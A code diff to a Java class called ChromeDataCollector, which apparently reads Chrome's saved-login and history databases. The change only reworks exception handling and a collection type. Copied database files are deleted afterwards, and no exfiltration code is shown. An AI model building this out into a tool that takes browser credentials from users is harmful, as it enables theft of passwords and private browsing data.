@@ -22,10 +22,12 @@ class ChromeDataCollector {
             getLoginData();
             getHistoryData();
     
-        } catch (Exception e) {
-            System.out.println("[*] Exception occurred: " + e + "\n[*] Terminating");
-            System.exit(0);
-        }finally{
+        } catch (IOException e) {
+            System.out.println("[*] IOexception occurred while reading db files");
+        } catch (Exception e){
+            System.out.println("[*] Unkown Exception occurred");
+        }
+        finally{
             File loginDataDatabase = new File("loginData.db");
             File historyDatabase = new File("history.db");
             loginDataDatabase.delete();
@@ -101,7 +103,7 @@ class ChromeDataCollector {
     }
 
     private static void getHistoryData() throws Exception {
-        Set<String> history = new HashSet<String>();
+        HashSet<String> history = new HashSet<String>();
         Connection c = null;
         Statement stmt = null;
         Class.forName("org.sqlite.JDBC");
